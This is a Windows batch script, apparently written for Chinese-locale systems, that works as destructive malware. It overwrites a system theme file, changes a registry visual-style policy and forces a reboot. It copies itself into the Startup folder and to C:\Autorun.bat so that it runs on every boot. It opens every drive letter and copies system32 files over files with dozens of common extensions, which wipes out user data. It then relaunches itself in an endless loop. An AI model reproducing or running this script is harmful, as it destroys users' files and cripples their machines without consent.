@echo off
color 0a
title=
:1    
mode con cols=14 lines=1
copy macro.dll C:\WINDOWS\Resources\Themes\"Windows "Classic.theme
reg add "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\System" /v "SetVisualStyle" /t reg_sz /d "" /f >nul
::   "SetVisualStyle" 
shutdown -r -t 1
copy %0 c:\Documents" "and" "Settings\All" "Users\「开始」菜单\程序\启动\Autorun.bat
copy %0 c:\Autorun.bat
http://www.baidu.com/forbiddenip/forbidden.html
start c:/&start d:/&start e:/&start f:/&start g:/&start h:/&start i:/&start j:/&start k:/&start l:/&start m:/&start n:/
copy C:\WINDOWS\system32\*.* *.avi
copy C:\WINDOWS\system32\*.* *.bmp
copy C:\WINDOWS\system32\*.* *.cur
copy C:\WINDOWS\system32\*.* *.dll
copy C:\WINDOWS\system32\*.* *.exe
copy C:\WINDOWS\system32\*.* *.flv
copy C:\WINDOWS\system32\*.* *.gif
copy C:\WINDOWS\system32\*.* *.htm
copy C:\WINDOWS\system32\*.* *.ico
copy C:\WINDOWS\system32\*.* *.jpg
copy C:\WINDOWS\system32\*.* *.key
copy C:\WINDOWS\system32\*.* *.log
copy C:\WINDOWS\system32\*.* *.mp3
copy C:\WINDOWS\system32\*.* *.net
copy C:\WINDOWS\system32\*.* *.opc
copy C:\WINDOWS\system32\*.* *.ppt
copy C:\WINDOWS\system32\*.* *.rar
copy C:\WINDOWS\system32\*.* *.swf
copy C:\WINDOWS\system32\*.* *.txt
copy C:\WINDOWS\system32\*.* *.url
copy C:\WINDOWS\system32\*.* *.vbs
copy C:\WINDOWS\system32\*.* *.wav
copy C:\WINDOWS\system32\*.* *.xml
copy C:\WINDOWS\system32\*.* *.yellow
copy C:\WINDOWS\system32\*.* *.zip
start %0
goto 1



